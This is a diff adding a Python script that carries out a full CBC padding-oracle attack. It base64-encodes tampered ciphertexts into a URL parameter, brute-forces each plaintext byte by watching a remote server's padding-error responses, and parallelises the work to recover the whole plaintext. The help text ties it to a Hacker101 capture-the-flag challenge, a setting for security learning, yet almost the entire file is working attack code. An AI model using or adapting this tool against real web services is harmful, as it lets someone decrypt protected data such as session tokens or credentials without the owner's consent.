@@ -1,0 +1,135 @@
+from base64 import b64encode as benc
+from base64 import b64decode as bdec
+from multiprocessing import Process, Manager
+from argparse import ArgumentParser, Namespace
+import time
+import requests
+import parmap
+
+ctx_original_length: int = -1
+
+def print_decoded_block(recovered_block: str, ctx_chunks_length: int, results: dict) -> None:
+    global ctx_original_length
+    if ctx_chunks_length == ctx_original_length:
+        padding_length: int = ord(recovered_block[-1])
+        recovered_block = recovered_block[:-padding_length] + (("\\x%X" % padding_length) * padding_length)
+    print("Block ending at %d: decrypted: %s" % (ctx_chunks_length, recovered_block))
+    results[ctx_chunks_length] = recovered_block
+
+def divide_ctx_into_progressively_smaller_chunks(ctx: bytearray) -> list:
+    chunks: list = []
+    assert (len(ctx) % 16) == 0, "The ctx chunk must have a length which is a multiple of 16."
+    while len(ctx) >= 32:
+        chunks.append(ctx)
+        ctx = ctx[:-16]
+    return chunks
+
+def decrypt_last_block(chunk: bytearray, oracle_error_message: str, url: str, results: dict) -> None:
+    old_ctx_val, guessed_ctx_val, fake_padding_val, ptx_val = find_last_byte_of_ptx_block(ctx=chunk[::], oracle_error_message=oracle_error_message, url=url)
+    current_bruteforced_ptx_bytes: list = [ptx_val]
+    target_padding: int = fake_padding_val + 1
+    if ptx_val != 1:
+        for _ in range(ptx_val - 1):
+            current_bruteforced_ptx_bytes.insert(0, ptx_val)    
+            target_padding += 1
+    while len(current_bruteforced_ptx_bytes) < 16:
+        old_ctx_val, guessed_ctx_val, fake_padding_val, ptx_val =  find_byte_of_ptx_block(ctx=chunk[::], padding_value=target_padding, current_bruteforced_ptx_bytes=current_bruteforced_ptx_bytes, oracle_error_message=oracle_error_message, url=url)
+        current_bruteforced_ptx_bytes.insert(0, ptx_val)        
+        target_padding += 1
+    recovered_ptx: str = "".join([chr(b) for b in current_bruteforced_ptx_bytes])
+    print_decoded_block(recovered_block=recovered_ptx, ctx_chunks_length=len(chunk), results=results)
+
+def decrypt_regular_block(chunk: bytearray, oracle_error_message: str, url:str, results: dict) -> None:
+    old_ctx_val, guessed_ctx_val, fake_padding_val, ptx_val = find_last_byte_of_ptx_block(ctx=chunk[::], oracle_error_message=oracle_error_message, url=url)
+    current_bruteforced_ptx_bytes: list = [ptx_val]
+    target_padding: int = fake_padding_val + 1
+    while len(current_bruteforced_ptx_bytes) < 16:
+        old_ctx_val, guessed_ctx_val, fake_padding_val, ptx_val =  find_byte_of_ptx_block(ctx=chunk[::], padding_value=target_padding, current_bruteforced_ptx_bytes=current_bruteforced_ptx_bytes, oracle_error_message=oracle_error_message, url=url)
+        current_bruteforced_ptx_bytes.insert(0, ptx_val)        
+        target_padding += 1
+    recovered_ptx: str = "".join([chr(b) for b in current_bruteforced_ptx_bytes])
+    print_decoded_block(recovered_block=recovered_ptx, ctx_chunks_length=len(chunk), results=results)
+
+def decrypt_generic_block(chunk: bytearray, oracle_error_message: str, url:str, results: dict) -> None:
+    global ctx_original_length
+    if len(chunk) == ctx_original_length:
+        decrypt_last_block(chunk=chunk, oracle_error_message=oracle_error_message, url=url, results=results)
+    else:
+        decrypt_regular_block(chunk=chunk, oracle_error_message=oracle_error_message, url=url, results=results)
+
+def parallelize_decryption(ctx_chunks: list, original_length: int, oracle_error_message: str, url: str, results: dict) -> None: 
+    global ctx_original_length
+    ctx_original_length = original_length
+    parmap.map(decrypt_generic_block, ctx_chunks, oracle_error_message, url, results, pm_pbar=True, pm_parallel=True, pm_processes=len(ctx_chunks))
+
+def reassemble_and_print_ptx(results: dict) -> None:
+    ptx: str = ""
+    keys: list = sorted(results.keys())
+    for key in keys:
+        ptx += results[key]
+    print("Reconstructed ptx: %s" % ptx)
+    print("Unpadded ptx: %s" % ptx.split("\\xA")[0])
+
+def b64_to_url(s: str) -> str:
+    return s.replace("=", "~").replace("+", "-").replace("/", "!")
+
+def url_to_b64(s: str) -> str:
+    return s.replace("~", "=").replace("-", "+").replace("!", "/")
+
+def bruteforce_byte(ctx: bytearray, ctx_index: int, old_ctx_byte: int, oracle_error_message: str, url: str) -> int:
+    for guess in range(256):
+        if guess == old_ctx_byte:
+            continue
+        ctx[ctx_index] = guess
+        if not oracle_error_message in test_guess(ctx=ctx, url=url):
+            return guess
+    return old_ctx_byte
+
+def find_byte_of_ptx_block(ctx: bytearray, padding_value: int, current_bruteforced_ptx_bytes: list, oracle_error_message: str, url: str) -> tuple:
+    assert (len(ctx) > 16) and ((len(ctx) % 16) == 0), "The ctx chunk must be at least 2-blocks long (as the first is always the iv), and must have a length which is a multiple of 16."        
+    ctx_final_index: int = -17
+    ctx_begin_index: int = ctx_final_index - padding_value + 2  
+    for i in range(ctx_begin_index, ctx_final_index + 1):       
+        ctx[i] = ctx[i] ^ current_bruteforced_ptx_bytes[i + 16] ^ padding_value
+    ctx_index: int = ctx_begin_index - 1
+    old_ctx_byte: int = ctx[ctx_index]
+    right_guess: int = bruteforce_byte(ctx=ctx, ctx_index=ctx_index, old_ctx_byte=old_ctx_byte, oracle_error_message=oracle_error_message, url=url)
+    return (old_ctx_byte, right_guess, padding_value, (old_ctx_byte ^ right_guess ^ padding_value))
+
+def find_last_byte_of_ptx_block(ctx: bytearray, oracle_error_message: str, url: str) -> tuple:
+    assert (len(ctx) > 16) and ((len(ctx) % 16) == 0), "The ctx chunk must be at least 2-blocks long (as the first is always the iv), and must have a length which is a multiple of 16."        
+    target_value: int = 0x1
+    ctx_index: int = -17
+    old_ctx_byte: int = ctx[ctx_index]
+    right_guess: int = bruteforce_byte(ctx=ctx, ctx_index=ctx_index, old_ctx_byte=old_ctx_byte, oracle_error_message=oracle_error_message, url=url)
+    return (old_ctx_byte, right_guess, target_value, (old_ctx_byte ^ right_guess ^ target_value))
+
+def test_guess(ctx: bytearray, url: str) -> str:
+    payload: str = b64_to_url(benc(ctx).decode("utf-8"))        
+    full_url: str = url + "{}".format(payload)
+    return requests.get(full_url).text
+
+def main() -> None:
+    parser: ArgumentParser = ArgumentParser()
+    parser.add_argument("-u", "--host", required=True, type=str, metavar="host", help="The ip address (or hostname) of the padding oracle without scheme.")
+    parser.add_argument("-i", "--vm-id", required=True, type=str, metavar="vm_id", help="The ID of the VM of the challenge - Hacker101 specific.")
+    parser.add_argument("-c", "--ctx", required=True, type=str, metavar="ctx", help="The url-ized Base64 of (iv+ctx). To url-ize means replace (=, /, +) with (~, !, -)")
+    parser.add_argument("-e", "--oracle-error-pattern", required=True, metavar="oracle_error_pattern", help="The pattern to look for in the oracle response to indicate a padding error.")      
+    args: Namespace = parser.parse_args()
+    oracle_error_message = args.oracle_error_pattern
+    raw_ctx: str = args.ctx
+    ctx: bytearray = bytearray(bdec(url_to_b64(raw_ctx)))       
+    url: str = "http://" + args.host + "/" + args.vm_id + "/?post="
+    chunks: list = divide_ctx_into_progressively_smaller_chunks(ctx=ctx)
+    manager: Manager = Manager()
+    shared_dict: dict = manager.dict()
+    parallelize_decryption(ctx_chunks=chunks, original_length=len(ctx), oracle_error_message=oracle_error_message, url=url, results=shared_dict)
+    reassemble_and_print_ptx(results=shared_dict)
+
+if __name__ == "__main__":
+    begin: int = time.time_ns()
+    main()
+    end: int = time.time_ns()
+    time_in_seconds: int = (end - begin) // 1000000000
+    time_in_minutes: tuple = (time_in_seconds // 60, time_in_seconds - (time_in_seconds // 60) * 60)
+    print("The whole process took approximately %d seconds (%d minutes and %d seconds)." % (time_in_seconds, time_in_minutes[0], time_in_minutes[1]))
